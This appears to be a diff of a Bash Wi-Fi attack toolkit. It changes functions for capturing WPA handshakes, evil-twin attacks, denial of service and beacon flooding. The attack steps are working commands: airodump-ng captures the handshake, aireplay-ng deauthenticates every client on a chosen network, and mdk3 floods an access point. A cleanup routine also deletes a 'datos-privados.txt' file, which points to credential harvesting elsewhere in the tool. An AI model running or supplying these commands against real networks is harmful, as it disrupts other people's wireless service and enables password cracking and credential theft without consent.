@@ -24,7 +24,7 @@ ctrl_c() {
 	tput cnorm
 	sudo rm dnsmasq.conf hostapd.conf 2>/dev/null
 	rm -r iface 2>/dev/null
-	sudo rm Handshake*
+	sudo rm Handshake* 2>/dev/null
 	find \-name datos-privados.txt | xargs rm 2>/dev/null
 	exit
 }
@@ -63,7 +63,7 @@ programs() {
 				sleep 0.5
 			else 
 				echo -e "\n${redColour}[-]$grayColour $program"
-				sleep 1
+				sleep 0.5
 				echo -e "\n${blueColour}[*]$grayColour Installing ${program}..." 
 				sudo apt-get install $program -y > /dev/null 2>&1
 
@@ -91,7 +91,7 @@ programs() {
 				sleep 0.5
 			else 
 				echo -e "\n${redColour}[-]$grayColour $program"
-				sleep 1
+				sleep 0.5
 				echo -e "\n${blueColour}[*]$grayColour Installing ${program}..." 
 				sudo pacman -S $program -y > /dev/null 2>&1
 
@@ -119,7 +119,7 @@ programs() {
 				sleep 0.5
 			else 
 				echo -e "\n${redColour}[-]$grayColour $program"
-				sleep 1
+				sleep 0.5
 				echo -e "\n${blueColour}[*]$grayColour Installing ${program}..." 
 				sudo dnf install $program -y > /dev/null 2>&1
 
@@ -161,33 +161,21 @@ updatepackages() {
 handshake_ataque() {
 	clear
 	echo -e "\n${turquoiseColour}[*]$grayColour Starting Handshake attack"
-	clear
 	sleep 1
  	tput cnorm
-	xterm -e "airodump-ng -w xtermNeT --output-format csv ${tar}" & > /dev/null 2>&1
+	xterm -hold -e "airodump-ng ${tar}" > /dev/null 2>&1
 	xtermnet=$!
-	sleep 5; kill -9 $xtermnet; wait $xtermnet 2>/dev/null
-	echo -e "${blueColour}->->->->-> Select a network <-<-<-<-<-${endColour}\n\n\n"
-	while IFS= read -r line; do
-		macrepeat=$(grep $line xtermNeT-01.csv | wc -l)
-		if [[ "$macrepeat" > 1 ]]; then
-			sed -i "s/${line}/+${line}/" xtermNeT-01.csv
-		fi
-	done < <(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1 | sed '/Station/,1d')
-
-	launch_irodump=$(cat xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1,6,4,9,14 | sed 's/,/   /g; /Station/,$d' | sed '$d' | nl -w3 -s "]    " | sed 's/[0-9]/[&/' | sed "s/\[/${rojo}\[${extrojo}/g; s/\]/${rojo}\]${extrojo}/g " | sed 's/WPA2 WPA/WPA2/;s/         -/        -/;s/        -/            -/;s/[0-9][0-9][0-9]    /&-/;s/    -W/   W/g;s/    -        -/           -/g;s/WEP    /WEP     /;s/WEP      /WEP     /; s/WPA    /WPA     /;s/WPA      /WPA     / ; s/OPN    /OPN     /; s/OPN      /OPN     /; s/    $/    (Hidden Wifi)/; s/ -1    (/ -1     (/;s/    ++/    /; s/    +/    /;s/+//g')
-	echo -e "               Bssid          CH    Encry    PWR       Essid\n----------------------------------------------------------------------\n$launch_irodump"
 	echo -ne "\n$greenColour[?]$grayColour Select a network (Essid): " && read ap
 	echo -ne "${greenColour}[?]$grayColour What channel is ${ap}?: " && read channel
-	tput civis; sudo rm xtermNeT*
+	tput civis
 	$cleancolor
 	echo -e "${greenColour}[*]$grayColour Network users are being deauthenticated"
 	$cleancolor
-
+	kill -9 $xtermnet; wait $xtermnet 2>/dev/null
 	xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar" &
 	airodump_filter_xterm_PID=$!
 
-	sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF $tar" &								
+	sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF $tar" &								
 	aireplay_xterm_PID=$!
 	sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
 
@@ -472,23 +460,11 @@ eviltrust() {
 }
 dosattack() {
 	clear; echo -e "\n${blueColourColour}[*]$grayColour Starting DoS attack..."; sleep 2
-	xterm -e "airodump-ng -w /tmp/xtermNeT --output-format csv ${tar}" &
-	xtermnet=$!
-	sleep 3; kill -9 $xtermnet; wait $xtermnet 2>/dev/null
-	echo -e "${blueColour}->->->->-> Select a network <-<-<-<-<-${endColour}\n\n\n"
-	while IFS= read -r line; do
-		macrepeat=$(grep $line /tmp/xtermNeT-01.csv | wc -l)
-		if [[ "$macrepeat" > 1 ]]; then
-			sed -i "s/${line}/+${line}/" /tmp/xtermNeT-01.csv
-		fi
-	done < <(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1 | sed '/Station/,1d')
-
-	launch_irodump=$(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1,6,4,9,14 | sed 's/,/   /g; /Station/,$d' | sed '$d' | nl -w3 -s "]    " | sed 's/[0-9]/[&/' | sed "s/\[/${rojo}\[${extrojo}/g; s/\]/${rojo}\]${extrojo}/g " | sed 's/WPA2 WPA/WPA2/;s/         -/        -/;s/        -/            -/;s/[0-9][0-9][0-9]    /&-/;s/    -W/   W/g;s/    -        -/           -/g;s/WEP    /WEP     /;s/WEP      /WEP     /; s/WPA    /WPA     /;s/WPA      /WPA     / ; s/OPN    /OPN     /; s/OPN      /OPN     /; s/    $/    (Hidden Wifi)/; s/ -1    (/ -1     (/;s/    ++/    /; s/    +/    /;s/+//g')
-	echo -e "               Bssid          CH    Encry    PWR       Essid\n----------------------------------------------------------------------\n$launch_irodump"
+	xterm -e "airodump-ng ${tar}" &
+	dosairdump_PID=$!
 	echo -ne "\n$greenColour[?]$grayColour Select a network (Essid): " && read redos
 	kill -9 $dosairdump_PID; wait $dosairdump_PID 2>/dev/null
-	echo -ne "${redColour}[?]$grayColourChannels Channels for attack (Recommend 1,6,11): " && read canalesdos
-	xterm -hold -e "sudo mdk3 $tar d -a $redos -c $canalesdos"
+	xterm -hold -e "sudo mdk3 $tar a -e $redos"
 }
 
 beaconflood() {
